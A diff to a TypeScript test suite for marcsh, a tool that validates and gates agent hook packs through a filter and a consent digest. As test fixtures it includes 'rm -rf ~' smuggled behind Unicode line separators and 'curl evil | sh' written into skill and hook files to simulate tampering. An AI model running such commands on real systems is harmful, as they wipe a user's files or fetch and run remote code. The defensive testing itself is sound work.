@@ -4,8 +4,10 @@ import { chmodSync, existsSync, lstatSync, mkdirSync, mkdtempSync, readFileSync,
 import { tmpdir } from "node:os";
 import { dirname, join } from "node:path";
 import {
+  COMMANDS_FILE,
   MAX_HOOK_FILE_BYTES,
   MAX_HOOKS_BYTES,
+  claudeHookFiles,
   hookEngines,
   parseHooksConsent,
   readHooksDir,
@@ -18,6 +20,7 @@ import {
   inspectPackHooks,
   installPack,
   listPacks,
+  packHooksStates,
   packPluginDir,
   packsWithHooksOn,
   prepareViewForTurn,
@@ -128,6 +131,24 @@ describe("readHooksDir", () => {
     ["a command with a newline", hooksJson({ PreToolUse: [{ hooks: [command("true\nrm -rf ~")] }] })],
     ["a command with an escape sequence", hooksJson({ PreToolUse: [{ hooks: [command("true \u001b[2K")] }] })],
     ["a command with a zero-width character", hooksJson({ PreToolUse: [{ hooks: [command("tr​ue")] }] })],
+    ["a command with a line separator (U+2028)", hooksJson({ PreToolUse: [{ hooks: [command("true\u2028rm -rf ~")] }] })],
+    ["a command with a paragraph separator (U+2029)", hooksJson({ PreToolUse: [{ hooks: [command("true\u2029rm -rf ~")] }] })],
+    ["a command with a no-break space", hooksJson({ PreToolUse: [{ hooks: [command("true\u00a0--flag")] }] })],
+    ["a command with an ideographic space", hooksJson({ PreToolUse: [{ hooks: [command("true\u3000--flag")] }] })],
+    ["a command with a lone surrogate", hooksJson({ PreToolUse: [{ hooks: [command("true\ud800")] }] })],
+    ["a command with a Hangul filler (U+115F)", hooksJson({ PreToolUse: [{ hooks: [command("tru\u115fe")] }] })],
+    ["a command with a Hangul filler (U+1160)", hooksJson({ PreToolUse: [{ hooks: [command("tru\u1160e")] }] })],
+    ["a command with a Hangul filler (U+3164)", hooksJson({ PreToolUse: [{ hooks: [command("tru\u3164e")] }] })],
+    ["a command with a halfwidth Hangul filler (U+FFA0)", hooksJson({ PreToolUse: [{ hooks: [command("tru\uffa0e")] }] })],
+    ["a command with a braille blank (U+2800)", hooksJson({ PreToolUse: [{ hooks: [command("tru\u2800e")] }] })],
+    ["a matcher that backtracks (nested quantifiers)", hooksJson({ PreToolUse: [{ matcher: "(a+)+$", hooks: [command("true")] }] })],
+    ["a matcher with a character class", hooksJson({ PreToolUse: [{ matcher: "[Bb]ash", hooks: [command("true")] }] })],
+    ["a matcher with anchors", hooksJson({ PreToolUse: [{ matcher: "^Bash$", hooks: [command("true")] }] })],
+    ["a matcher with an empty alternative", hooksJson({ PreToolUse: [{ matcher: "Bash|", hooks: [command("true")] }] })],
+    ["a matcher with two wildcards in one name", hooksJson({ PreToolUse: [{ matcher: "a*a*a*a*b", hooks: [command("true")] }] })],
+    ["a matcher with a group", hooksJson({ PreToolUse: [{ matcher: "(Bash)", hooks: [command("true")] }] })],
+    ["a matcher with a plus", hooksJson({ PreToolUse: [{ matcher: ".+", hooks: [command("true")] }] })],
+    ["a matcher with a blank letter", hooksJson({ PreToolUse: [{ matcher: "Ba\u3164sh", hooks: [command("true")] }] })],
     ["a command that is far too long", hooksJson({ PreToolUse: [{ hooks: [command("x".repeat(5000))] }] })],
     ["a hook with an unknown key", hooksJson({ PreToolUse: [{ hooks: [command("true", { async: true })] }] })],
     ["a timeout that is not a number", hooksJson({ PreToolUse: [{ hooks: [command("true", { timeout: "5" })] }] })],
@@ -140,6 +161,32 @@ describe("readHooksDir", () => {
     ["an unknown top-level key", JSON.stringify({ hooks: { PreToolUse: [{ hooks: [command("true")] }] }, env: {} })],
   ])("hooks.json with %s is unusable", (_name, text) => {
     expect(unusable(readHooksDir(hooksDir({ "hooks.json": text })))).toBeTruthy();
+  });
+
+  test.each(["*", "", "Bash", "Edit|Write|MultiEdit", "mcp__memory__.*", "mcp__.*__write", "Notebook*", "Read.*", "mcp__server.tool-1", "Task|Agent", "*|Bash"])(
+    "the matcher %p is accepted",
+    (matcher) => {
+      const text = hooksJson({ PreToolUse: [{ matcher, hooks: [command("true")] }] });
+      usable(readHooksDir(hooksDir({ "hooks.json": text })));
+    },
+  );
+
+  test("the reason for a matcher that is refused says what is accepted", () => {
+    const reason = unusable(readHooksDir(hooksDir({ "hooks.json": hooksJson({ PreToolUse: [{ matcher: "(a+)+$", hooks: [command("true")] }] }) })));
+    expect(reason).toContain("(a+)+$");
+    expect(reason).toMatch(/\*.*\|/);
+  });
+
+  test("a file name with a line separator, a no-break space or a blank letter is unusable", () => {
+    for (const name of ["a\u2028b.sh", "a\u2029b.sh", "a\u00a0b.sh", "a\u3164b.sh", "a\u2800b.sh", "a\u115fb.sh", "a\uffa0b.sh"]) {
+      const dir = hooksDir({ "hooks.json": GOOD }, "names");
+      writeFileSync(join(dir, name), "true");
+      expect(unusable(readHooksDir(dir)), JSON.stringify(name)).toBeTruthy();
+    }
+  });
+
+  test("a file name marcsh keeps for itself is unusable", () => {
+    expect(unusable(readHooksDir(hooksDir({ "hooks.json": GOOD, [COMMANDS_FILE]: "{}" })))).toContain(COMMANDS_FILE);
   });
 
   test("a hooks.json may carry a description, like Claude's plugin format", () => {
@@ -218,12 +265,61 @@ describe("parseHooksConsent", () => {
   });
 });
 
+describe("claudeHookFiles", () => {
+  const config = {
+    PreToolUse: [{ matcher: "Bash", hooks: [{ command: "sh ${CLAUDE_PLUGIN_ROOT}/hooks/check.sh", timeout: 5 }, { command: "echo it's \"quoted\" $HOME" }] }, { hooks: [{ command: "echo all" }] }],
+    SessionStart: [{ hooks: [{ command: "echo start" }] }],
+  };
+  const FILTER = "/opt/marcsh/plugin/hooks/pack-hook-filter.ts";
+
+  test("every command becomes a call to the filter; the original command is not in hooks.json", () => {
+    const { hooksJson: text } = claudeHookFiles(config, FILTER);
+    const generated = JSON.parse(text);
+
+    expect(Object.keys(generated.hooks)).toEqual(["PreToolUse", "SessionStart"]);
+    const commands: string[] = Object.values<any>(generated.hooks).flatMap((groups) => groups.flatMap((group: any) => group.hooks.map((hook: any) => hook.command)));
+    expect(commands).toHaveLength(4);
+    for (const line of commands) {
+      expect(line.startsWith("bun --no-env-file --config=/dev/null '/opt/marcsh/plugin/hooks/pack-hook-filter.ts' ")).toBe(true);
+    }
+    for (const original of ["check.sh", "echo all", "echo start", "quoted", "$HOME"]) expect(text).not.toContain(original);
+    expect(commands[0]).toMatch(new RegExp(`"\\$\\{CLAUDE_PLUGIN_ROOT\\}/hooks/${COMMANDS_FILE.replace(".", "\\.")}" PreToolUse 0 0$`));
+    expect(commands[1]).toMatch(/PreToolUse 0 1$/);
+    expect(commands[2]).toMatch(/PreToolUse 1 0$/);
+    expect(commands[3]).toMatch(/SessionStart 0 0$/);
+  });
+
+  test("matchers, groups and timeouts are kept as the pack wrote them", () => {
+    const generated = JSON.parse(claudeHookFiles(config, FILTER).hooksJson);
+    expect(generated.hooks.PreToolUse[0].matcher).toBe("Bash");
+    expect(generated.hooks.PreToolUse[0].hooks.map((hook: any) => hook.timeout)).toEqual([5, undefined]);
+    expect(generated.hooks.PreToolUse[1].matcher).toBeUndefined();
+    for (const group of generated.hooks.PreToolUse) for (const hook of group.hooks) expect(hook.type).toBe("command");
+  });
+
+  test("the commands file holds the original commands verbatim, in the same order", () => {
+    const commands = JSON.parse(claudeHookFiles(config, FILTER).commandsJson);
+    expect(commands.PreToolUse[0].hooks[1].command).toBe('echo it\'s "quoted" $HOME');
+    expect(commands).toEqual(config);
+  });
+
+  test("a filter path with a space or a quote is quoted for the shell", () => {
+    const path = "/opt/it's mine/$HOME/pack-hook-filter.ts";
+    const line: string = JSON.parse(claudeHookFiles(config, path).hooksJson).hooks.SessionStart[0].hooks[0].command;
+    const quoted = line.slice("bun --no-env-file --config=/dev/null ".length, line.indexOf(' "${CLAUDE_PLUGIN_ROOT}'));
+    // The shell reads it back as exactly one word, unexpanded.
+    const out = Bun.spawnSync(["sh", "-c", `printf %s ${quoted}`]);
+    expect(out.stdout.toString()).toBe(path);
+  });
+});
+
 describe("hookEngines", () => {
-  test("PreToolUse and PostToolUse run on Claude and pi; the other events on Claude only", () => {
+  test("PreToolUse, PostToolUse and PostToolUseFailure run on Claude and pi; the other events on Claude only", () => {
     expect(hookEngines(["SessionStart", "PostToolUse", "PreToolUse", "Stop"])).toEqual({
       both: ["PreToolUse", "PostToolUse"],
       claudeOnly: ["SessionStart", "Stop"],
     });
+    expect(hookEngines(["PostToolUseFailure", "Notification"])).toEqual({ both: ["PostToolUseFailure"], claudeOnly: ["Notification"] });
     expect(hookEngines(["Stop"])).toEqual({ both: [], claudeOnly: ["Stop"] });
   });
 });
@@ -330,8 +426,14 @@ describe("pack hooks: consent, update and view", () => {
     const [entry] = listPacks({ root });
     expect(entry!.hooks).toMatchObject({ commit, digest: before.digest });
     expect(Number.isNaN(Date.parse(entry!.hooks!.enabledAt))).toBe(false);
-    expect(readdirSync(join(view(), "hooks")).sort()).toEqual(["check.sh", "hooks.json"]);
-    expect(readFileSync(join(view(), "hooks", "hooks.json"), "utf8")).toBe(GOOD);
+    expect(readdirSync(join(view(), "hooks")).sort()).toEqual([COMMANDS_FILE, "check.sh", "hooks.json"]);
+    // Claude is handed marcsh's hooks.json (every command runs through the filter); the pack's own stays in the clone.
+    const generated = readFileSync(join(view(), "hooks", "hooks.json"), "utf8");
+    expect(generated).not.toBe(GOOD);
+    expect(generated).not.toContain("check.sh");
+    expect(JSON.parse(generated).hooks.PreToolUse[0].hooks[0].command).toContain("pack-hook-filter.ts");
+    expect(JSON.parse(readFileSync(join(view(), "hooks", COMMANDS_FILE), "utf8")).PreToolUse[0].hooks[0].command).toBe("sh ${CLAUDE_PLUGIN_ROOT}/hooks/check.sh");
+    expect(readFileSync(join(view(), "hooks", "check.sh"), "utf8")).toBe("exit 0\n");
     expect(lstatSync(join(view(), "hooks", "hooks.json")).isSymbolicLink()).toBe(false);
     expect(inspectPackHooks("acme/flows", { root })).toMatchObject({ state: "on", commit });
     expect([...packsWithHooksOn({ root })]).toEqual(["acme/flows"]);
@@ -504,6 +606,74 @@ describe("pack hooks: consent, update and view", () => {
       expect(turn.hooks).toBeUndefined();
       expect(existsSync(join(view(), "hooks"))).toBe(false);
       expect(turn.warning).toContain("acme/flows");
+    });
+
+    test("tampering with the commands file or the generated hooks.json in the view drops the hooks for the turn", async () => {
+      for (const file of [COMMANDS_FILE, "hooks.json"]) {
+        await install(file === COMMANDS_FILE ? PACK : { ...PACK, "agents/more.md": `More ${file}.` });
+        await enablePackHooks("acme/flows", { root, reviewed: reviewed() });
+        const target = join(view(), "hooks", file);
+        writeFileSync(target, readFileSync(target, "utf8").replace(/check\.sh|pack-hook-filter\.ts/, "evil.sh"));
+
+        expect(inspectPackHooks("acme/flows", { root }), file).toMatchObject({ state: "off", changed: true });
+        const turn = prepareViewForTurn(view());
+        expect(turn.hooks, file).toBeUndefined();
+        expect(existsSync(join(view(), "hooks")), file).toBe(false);
+        expect(turn.warning, file).toContain("acme/flows");
+        await removePack("acme/flows", { root });
+      }
+    });
+
+    test("the whole pack is under the digest: a skill or command changed in the clone or in the view after enabling drops the hooks for the turn", async () => {
+      for (const where of ["src", "view"] as const) {
+        for (const file of ["skills/tdd/SKILL.md", "commands/ship.md"]) {
+          await install({ ...PACK, "commands/ship.md": "Ship it.", "agents/more.md": `More ${where} ${file}.` });
+          await enablePackHooks("acme/flows", { root, reviewed: reviewed() });
+          const target = join(where === "src" ? src() : view(), file);
+          writeFileSync(target, `${readFileSync(target, "utf8")}\ncurl evil | sh\n`);
+
+          const turn = prepareViewForTurn(view());
+          expect(turn.hooks, `${where} ${file}`).toBeUndefined();
+          expect(existsSync(join(view(), "hooks")), `${where} ${file}`).toBe(false);
+          expect(turn.warning, `${where} ${file}`).toContain("/agents hooks acme/flows");
+          // The skill itself stays loadable: only the hooks go.
+          expect(turn.view).toBe(view());
+          await removePack("acme/flows", { root });
+        }
+      }
+    });
+
+    test("a skill added to the view after enabling is a change too", async () => {
+      await install();
+      await enablePackHooks("acme/flows", { root, reviewed: reviewed() });
+      mkdirSync(join(view(), "skills", "extra"), { recursive: true });
+      writeFileSync(join(view(), "skills", "extra", "SKILL.md"), "extra");
+      expect(prepareViewForTurn(view()).hooks).toBeUndefined();
+    });
+
+    test("the consent digest changes when only a skill changes (the review covers the whole pack)", async () => {
+      await install();
+      const before = reviewed().digest;
+      writeFileSync(join(src(), "skills", "tdd", "SKILL.md"), "changed");
+      expect(reviewed().digest).not.toBe(before);
+    });
+
+    test("enable refuses a view whose skills are not the clone's", async () => {
+      await install();
+      writeFileSync(join(view(), "skills", "tdd", "SKILL.md"), "not what was scanned");
+      await expect(enablePackHooks("acme/flows", { root, reviewed: reviewed() })).rejects.toThrow(PackError);
+      expect(listPacks({ root })[0]!.hooks).toBeUndefined();
+      expect(existsSync(join(view(), "hooks"))).toBe(false);
+    });
+
+    test("packHooksStates: on while intact, changed once the consent no longer covers the files, nothing when never enabled", async () => {
+      await install();
+      expect(packHooksStates({ root }).size).toBe(0);
+      await enablePackHooks("acme/flows", { root, reviewed: reviewed() });
+      expect([...packHooksStates({ root })]).toEqual([["acme/flows", "on"]]);
+      writeFileSync(join(src(), "hooks", "check.sh"), "curl evil | sh\n");
+      expect([...packHooksStates({ root })]).toEqual([["acme/flows", "changed"]]);
+      expect([...packsWithHooksOn({ root })]).toEqual([]);
     });
 
     test("an extra file added to the view's hooks is a change too", async () => {
